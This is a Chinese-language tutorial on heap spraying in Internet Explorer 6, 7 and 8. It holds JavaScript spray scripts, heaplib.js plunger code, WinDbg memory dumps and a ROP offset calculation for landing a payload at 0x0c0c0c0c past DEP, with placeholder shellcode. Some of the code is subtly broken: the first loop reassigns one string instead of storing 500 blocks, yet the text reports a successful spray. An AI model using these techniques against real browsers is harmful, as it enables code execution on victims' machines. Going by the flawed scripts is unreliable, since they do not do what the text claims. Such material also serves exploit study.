### 通过数组分配大量内存

#### XP下IE6和IE7的堆喷射
为了在Windows XP SP3上测试多个版本的Internet Explorer (IE)，可以使用IE Collection安装不同版本的IE。本例中，我们安装了IE6和IE7进行测试。

**稳定的堆喷脚本:**

```javascript
var shellcode = unescape('%u4141%u4141');
var bigblock = unescape('%u9090%u9090');
var headsize = 20;
var slackspace = headsize + shellcode.length;

while (bigblock.length < 0x40000 * 2) {
    bigblock += bigblock;
}

// 分配500个大小为0x40000 * 2的内存块
for (var i = 0; i < 500; i++) {
    var block = bigblock;
}
```

**结果:**
运行上述脚本后，使用调试器检查内存分配情况：

```plaintext
0:009> dd 0c0c0c0c
0c0c0c0c  90909090 90909090 90909090 90909090
0c0c0c1c  90909090 90909090 90909090 90909090
...
```

多次尝试均成功。查看堆的状态：

```plaintext
0:009> !heap -stat -h 00140000
 heap @ 00140000
 group-by: TOTSIZE max-display: 20
 size     #blocks     total     ( %)
 7ffe0 1f5 - fa7c160  (99.78)
 8000 1 - 8000  (0.01)
 7fe0 1 - 7fe0  (0.01)
 ...
```

基本上，每个块的大小都是7ffe0（即0x40000 * 2）。

#### Win7下的IE8的堆喷射
对于IE8浏览器，之前的脚本不再适用。IE8通常启用了数据执行保护（DEP），因此不仅需要堆喷射，还需要精准的堆喷射，以确保预测的地址正好在返回导向编程（ROP）链的起始位置，从而绕过DEP防护。

**JavaScript字符串分配机制:**

JavaScript申请字符串并不总是从系统堆中分配，而是由`OLEAUT32.DLL`中的堆管理器管理。该管理器维护了一张缓存表，每当一块内存被释放时，指针会被放入缓存表中，下次分配内存时优先使用缓存中的内存块。

缓存表有四个bin，每个bin可以容纳6块已经被释放的内存块，每个bin可容纳块的大小不同，大于32767 bytes的块直接被释放，不会缓存：

- `CacheEntry bin_1_32 [6];` // 块大小从1到32字节
- `CacheEntry bin_33_64 [6];` // 块大小从33到64字节
- `CacheEntry bin_65_256 [6];` // 块大小从65到256字节
- `CacheEntry bin_257_32768 [6];` // 块大小从257到32768字节

为了保证每次分配内存都由系统堆处理，而不是缓存，Alexander Sotirov提出了plunger技术，在堆喷前强制刷新所有缓存块。具体实现是为每个bin申请其可容纳的最大堆块大小的内存，确保所有缓存都是空的，接下来的分配都会由系统堆处理。

**使用heaplib.js库进行精准堆喷:**

为了实现精准的堆喷，在IE8下使用了[heaplib.js](http://pwdme.cc/heaplib.js)这个JavaScript的堆管理库。Sotirov在[Heap Feng Shui in JavaScript](http://pwdme.cc/Heap_Feng_Sui_in_JavaScript.pdf)一文中描述并实现了该库。

**heaplib中的plunger实现:**

```javascript
heapLib.ie.prototype.flushOleaut32 = function() {
    this.debug("Flushing the OLEAUT32 cache");
    // 释放最大大小的块并挤出所有较小的块
    this.freeOleaut32("oleaut32");
    // 再次分配最大大小的块，清空缓存
    for (var i = 0; i < 4; i++) {
        this.allocOleaut32(32768);
    }
};

var heap_obj = new heapLib.ie(0x10000);
var code = unescape("%ucccc%ucccc");    // 要执行的代码
var nops = unescape("%u9090%u9090");    // NOPs
while (nops.length < 0x10000 - code.length) {
    nops += nops;
}
```

**查看分配的内存:**

```plaintext
0:016> !heap -flt s 7ffc0
_HEAP @ 140000
HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
037c0018 fff8 0000  [0b]   037c0020    7ffc0 - (busy VirtualAlloc)
03850018 fff8 fff8  [0b]   03850020    7ffc0 - (busy VirtualAlloc)
...
0c100018 fff8 fff8  [0b]   0c100020    7ffc0 - (busy VirtualAlloc)

0:016> !heap -p -a 0c0c0c0c
address 0c0c0c0c found in
_HEAP @ 140000
HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
0c070018 fff8 0000  [0b]   0c070020    7ffc0 - (busy VirtualAlloc)
```

可以看到地址都是以0x10000对齐的，这为精准堆喷打下了基础，可以精确计算堆块中的位置，0x0c0c0c0c处于0x0c070018处的块中。

**查看内存内容:**

```plaintext
0:016> dd 0c0c0018
0c0c0018  90909090 cccccccc 90909090 90909090
0c0c0028  90909090 90909090 90909090 90909090
```

下一个块起始于0x0c0c0018+0x8，计算ROP起始偏移：

```plaintext
0x0c0c0c0c - 0x0c0c0018 + 0x8 = 0xbec
0xbec / 2 = 0x5f6
```

假设ROP链为AAAABBBBCCCCDDDD，shellcode为xccxccxccxcc，将脚本改为：

```javascript
var heap_obj = new heapLib.ie(0x10000);
var code = unescape("%ucccc%ucccc");
var rop = unescape("%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444");
var padding = unescape("%u9090%u9090");

while (padding.length < 0x10000 - code.length - rop.length) {
    padding += padding;
}

var payload = padding + rop + code;
heap_obj.alloc(payload);
```

**查看预测地址:**

```plaintext
0:019> dd 0c0c0c0c
0c0c0c0c  41414141 42424242 43434343 44444444
0c0c0c1c  cccccccc cccccccc cccccccc cccccccc
0c0c0c2c  cccccccc cccccccc cccccccc cccccccc
```

通过这种方式，我们可以实现精准的堆喷射，并确保预测的地址正确。